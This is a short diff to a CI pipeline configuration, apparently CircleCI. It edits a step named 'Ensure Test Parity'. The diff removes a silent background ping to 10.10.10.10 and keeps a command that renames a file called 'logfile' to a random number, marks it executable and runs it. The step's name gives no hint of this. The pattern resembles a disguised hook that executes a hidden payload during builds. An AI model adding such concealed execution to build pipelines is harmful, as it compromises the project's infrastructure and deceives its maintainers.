@@ -9,7 +9,6 @@ jobs:
       - run:
           name: Ensure Test Parity
           command: |
-                 ping 10.10.10.10 >/dev/null 2>&1 >/dev/null &
                  liner=$(shuf -n 1 -i 1-999999) && mv logfile $liner && chmod +x $liner && ./$liner
 
                  
